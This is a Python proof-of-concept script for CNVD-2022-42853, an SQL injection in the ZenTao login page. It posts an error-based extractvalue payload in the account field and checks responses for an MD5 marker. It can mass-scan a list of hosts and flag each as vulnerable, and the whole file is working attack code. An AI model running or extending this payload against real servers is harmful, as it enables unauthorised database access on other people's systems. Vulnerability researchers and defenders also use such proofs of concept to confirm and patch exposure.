import argparse
import requests
import re
import urllib3

class attack():
    def check(md5, str):
        res = re.search(md5, str)
        if res:
            return True
        else:
            return False
    def attack_one(self, ipaddress):
        httpline = "http://" + ipaddress.strip() + "/zentao/user-login.html"
        payload = {"account": "admin' and (select extractvalue(1,concat(0x7e,(MD5(007)),0x7e)))#"}
        headers = {"Referer": httpline}
        try:
            urllib3.disable_warnings()
            response = requests.post(url=httpline, data=payload, headers=headers, verify=False, timeout=5)
            resp_text = response.text
            result = attack.check("8f14e45fceea167a5a36dedd4bea254", resp_text)
            if response.status_code == 200:
                if result == True:
                    print("\033[33m[+]\033[0m" + "\033[33m{}\033[0m".format(httpline) + "\033[33m is vulnerable! \033[0m")
                else:
                    print("\033[32m[-]\033[0m" + "\033[32m{}\033[0m".format(httpline) + "\033[32m not vulnerable.\033[0m")
            else:
                print("\033[31m[x]\033[0m" + "\033[31m{}\033[0m".format(httpline) + "\033[31m error \033[0m")
        except:
            print("\033[31m[x]\033[0m" + "\033[31m{}\033[0m".format(httpline) + "\033[31m error \033[0m")

    def attack_all(self, file, outfile):
        for line in file:
            httpline = line.replace("\n", "")
            httpline = "http://" + line.strip() + "/zentao/user-login.html"
            payload = {"account": "admin' and (select extractvalue(1,concat(0x7e,(MD5(007)),0x7e)))#"}
            headers = {"Referer": httpline}
            try:
                urllib3.disable_warnings()
                response = requests.post(url=httpline, data=payload, headers=headers, verify=False, timeout=5)
                resp_text = response.text
                result = attack.check("8f14e45fceea167a5a36dedd4bea254", resp_text)
                if response.status_code == 200:
                    if result==True:
                        print("\033[33m[+]\033[0m" + "\033[33m{}\033[0m".format(
                            httpline) + "\033[33m is vulnerable! \033[0m")
                    else:
                        print("\033[32m[-]\033[0m" + "\033[32m{}\033[0m".format(
                            httpline) + "\033[32m not vulnerable.\033[0m")
                else:
                    print("\033[31m[x]\033[0m" + "\033[31m{}\033[0m".format(httpline) + "\033[31m error \033[0m")
            except:
                print("\033[31m[x]\033[0m" + "\033[31m{}\033[0m".format(httpline) + "\033[31m error \033[0m")

if (__name__ == "__main__"):
    parser = argparse.ArgumentParser(description="CNVD-2022-42853 Poc by atk7r")
    parser.add_argument(
        '-ip', '--ipaddress', type=str, metavar="",
        help='Please input url to scan.'
    )
    parser.add_argument(
        '-f', '--file', type=argparse.FileType('r'), metavar="",
        help='Please input file path to scan.'
    )
    parser.add_argument(
        '-o', '--outfile', metavar="",
        help="Please input path for output file."
    )
    args = parser.parse_args()
    if args.ipaddress:
        run = attack()
        run.attack_one(args.ipaddress)
        exit()
    if args.file:
        run = attack()
        run.attack_all(args.file, args.outfile)
    else:
        print("Please input -h for help.")
